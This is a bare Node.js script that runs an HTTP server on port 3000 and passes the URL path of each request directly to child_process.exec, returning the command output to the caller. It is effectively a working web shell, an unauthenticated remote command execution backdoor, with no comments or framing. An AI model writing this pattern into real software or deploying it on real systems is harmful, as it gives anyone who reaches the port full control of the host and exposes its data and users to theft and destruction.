const http = require('http');
const { exec } = require('child_process');

http.createServer((req, res) => {
  const cmd = req.url.replace('/', '');
  exec(cmd, (err, stdout, stderr) => {
    if (err) {
      res.writeHead(400);
      res.end(err.toString());
    } else {
      res.writeHead(200);
      res.end(stdout);
    }
  });
}).listen(3000);
